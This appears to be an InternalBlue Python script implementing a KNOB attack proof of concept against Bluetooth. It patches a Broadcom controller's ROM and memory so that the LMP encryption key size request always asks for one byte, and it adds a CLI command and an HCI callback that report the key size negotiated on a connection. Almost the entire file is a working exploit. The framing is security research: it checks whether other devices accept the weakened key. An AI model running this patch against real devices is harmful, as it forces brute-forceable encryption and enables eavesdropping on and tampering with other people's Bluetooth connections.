import sys
import argparse
from argparse import Namespace

import cmd2
from cmd2 import CommandSet
from pwnlib.asm import asm

from internalblue import Address, hci
from internalblue.cli import InternalBlueCLI, auto_int
from internalblue.hcicore import HCICore
from internalblue.utils.packing import p16, u16

internalblue = HCICore()
internalblue.interface = internalblue.device_list()[0][1]

if not internalblue.connect():
    internalblue.logger.critical("No connection to target device.")
    exit(-1)

internalblue.logger.info(
    "Installing patch which ensures that send_LMP_encryption_key_size_req is always len=1!"
)

patch = asm("mov r2, #0x1", vma=0x689F0)
internalblue.patchRom(Address(0x689F0), patch)

internalblue.writeMem(0x204127, b"\x01")

internalblue.logger.info(
    "-----------------------\n"
    "Installed KNOB PoC. If connections to other devices succeed, they are vulnerable to KNOB.\n"
    "Monitoring device behavior is a bit tricky on Linux, LMP messages might appear in btmon.\n"
    "For more details, see special instructions for BlueZ.\n"
    "-----------------------KNOB-----------------------\n"
    "Automatically continuing on KNOB interface...\n"
    "Use the 'knob' command to *debug* the attack, i.e.:\n"
    "    knob --hnd 0x0c\n"
    "...shows the key size of handle 0x000c.\n"
)


class KnobCommands(CommandSet):
    knob_parser = argparse.ArgumentParser()
    knob_parser.add_argument(
        "--hnd", type=auto_int, default=0x000C, help="Handle KNOB connection."
    )

    @cmd2.with_argparser(knob_parser)
    def work(self, args):
        """Debugs which key length is currently active within a connection handle."""
        internalblue.sendHciCommand(hci.HCI_COMND.Encryption_Key_Size, p16(args.hnd))
        return True


def hciKnobCallback(record):
    """
    Adds a new callback function so that we do not need to call Wireshark.
    """
    hcipkt = record[0]
    if not issubclass(hcipkt.__class__, hci.HCI_Event):
        return

    if hcipkt.event_code == 0x0E:
        if u16(hcipkt.data[1:3]) == 0x1408:
            if hcipkt.data[3] == 0x12:
                internalblue.logger.info(
                    "No key size available.\n"
                    " - Did you already negotiate an encrypted connection?\n"
                    " - Did you choose the correct connection handle?\n"
                )
            else:
                internalblue.logger.info(
                    "HCI_Read_Encryption_Key_Size result for handle 0x%x: %x"
                    % (u16(hcipkt.data[4:6]), hcipkt.data[6])
                )

    return


internalblue.registerHciCallback(hciKnobCallback)


cli = InternalBlueCLI(
    Namespace(data_directory=None, verbose=False, trace=None, save=None), internalblue
)
sys.exit(cli.cmdloop())
